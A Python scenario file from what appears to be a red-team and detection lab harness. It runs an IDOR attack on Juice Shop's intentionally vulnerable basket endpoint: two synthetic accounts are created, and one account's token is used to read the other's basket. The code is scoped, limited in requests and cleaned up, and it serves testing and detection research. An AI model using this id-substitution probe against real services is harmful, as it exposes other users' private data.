"""Scenario: broken access control / IDOR on /rest/basket/:id, using two
synthetic users created fresh inside the lab instance (brief §5).

This targets Juice Shop's documented "Basket Access" teaching challenge: the
basket-lookup route authorizes by nothing but the numeric id in the URL (see
build/routes/basket.js — no check that the requester's own session owns that
basket id). Both accounts are created for this run only, with randomised
emails local to the lab instance; neither is a real identity.

Observable, machine-checked outcome: whether User B's own session token can
retrieve User A's basket (by A's basket id, taken from A's own login
response) and get back JSON containing that basket's id — versus a control
request for B's OWN basket id, which must succeed normally.
"""
from __future__ import annotations

import secrets

from services.scenarios.base import (Scenario, ScenarioObservations, ScopedClient,
                                     SuccessCriterion)


def _synthetic_user() -> dict:
    tag = secrets.token_hex(6)
    return {"email": f"redbears-{tag}@lab.invalid", "password": f"RedBears!{tag}", "passwordRepeat": None}


async def _register_and_login(client: ScopedClient, user: dict) -> dict:
    user = {**user, "passwordRepeat": user["password"]}
    reg = await client.request("POST", "/api/Users/", json=user)
    if reg.status_code not in (200, 201):
        raise RuntimeError(f"Synthetic user registration failed: HTTP {reg.status_code}")
    login = await client.request("POST", "/rest/user/login",
                                 json={"email": user["email"], "password": user["password"]})
    if login.status_code != 200:
        raise RuntimeError(f"Synthetic user login failed: HTTP {login.status_code}")
    auth = login.json()["authentication"]
    return {"token": auth["token"], "bid": auth["bid"], "email": user["email"]}


async def _run(client: ScopedClient, obs: ScenarioObservations) -> None:
    user_a = await _register_and_login(client, _synthetic_user())
    user_b = await _register_and_login(client, _synthetic_user())
    obs.probes["user_a_bid"], obs.probes["user_b_bid"] = user_a["bid"], user_b["bid"]
    # Ground truth for the detection evaluator (services/detection) — which
    # synthetic identity owns which basket id — carried as a test-harness
    # header (see telemetry_proxy.py), not inferred from the attack itself.
    obs.probes["bid_owner"] = {user_a["bid"]: "userA", user_b["bid"]: "userB"}
    # Kept only in-process for this run (never written to telemetry — the proxy
    # logs the X-RedBears-Actor label, not the Authorization header) so the
    # benign-comparison-traffic step can re-authenticate as each owner.
    obs.probes["bid_token"] = {user_a["bid"]: user_a["token"], user_b["bid"]: user_b["token"]}
    obs.notes.append(f"Created two synthetic accounts; A's basket id={user_a['bid']}, B's basket id={user_b['bid']}.")

    control = await client.request("GET", f"/rest/basket/{user_b['bid']}",
                                    headers={"Authorization": f"Bearer {user_b['token']}", "X-RedBears-Actor": "userB"})
    obs.probes["control_status"] = control.status_code

    probe = await client.request("GET", f"/rest/basket/{user_a['bid']}",
                                 headers={"Authorization": f"Bearer {user_b['token']}", "X-RedBears-Actor": "userB"})
    obs.probes["probe_status"] = probe.status_code
    returned_id = None
    if probe.status_code == 200:
        try:
            # Juice Shop wraps results as {"status": "success", "data": {...}}
            # (see build/lib/utils.js::queryResultToJson) — read the real field.
            returned_id = (probe.json().get("data") or {}).get("id")
        except ValueError:
            pass
    obs.probes["probe_returned_basket_id"] = returned_id
    obs.notes.append(
        f"User B requested User A's basket ({user_a['bid']}) with B's own token: "
        f"HTTP {probe.status_code}" + (f", basket id {returned_id} returned." if returned_id else "."))


def build() -> Scenario:
    return Scenario(
        id="idor_basket_access",
        title="Broken access control / IDOR — /rest/basket/:id across two users",
        description=("Creates two fresh synthetic accounts and tests whether User B's own "
                     "session can read User A's basket by substituting A's basket id in the "
                     "request path."),
        lab_template="juice-shop",
        prerequisites=["A running, isolated Juice Shop lab instance with open self-registration."],
        permitted_target="The provisioned lab instance's own proxy URL only.",
        max_requests=6,
        timeout_s=30,
        success_criteria=[
            SuccessCriterion("control_succeeds", "User B can read their OWN basket normally (200).",
                            lambda o: o.probes.get("control_status") == 200),
            SuccessCriterion("cross_user_access",
                            "User B's token retrieves User A's basket (200, A's basket id returned).",
                            lambda o: (o.probes.get("probe_status") == 200
                                      and o.probes.get("probe_returned_basket_id") == o.probes.get("user_a_bid"))),
        ],
        required_telemetry=["POST /api/Users/ x2, POST /rest/user/login x2, GET /rest/basket/:id x2"],
        cleanup="Lab instance reset or cleanup via services.lab.provisioner (both synthetic accounts discarded with the instance's DB).",
        available=True,
        run=_run,
    )
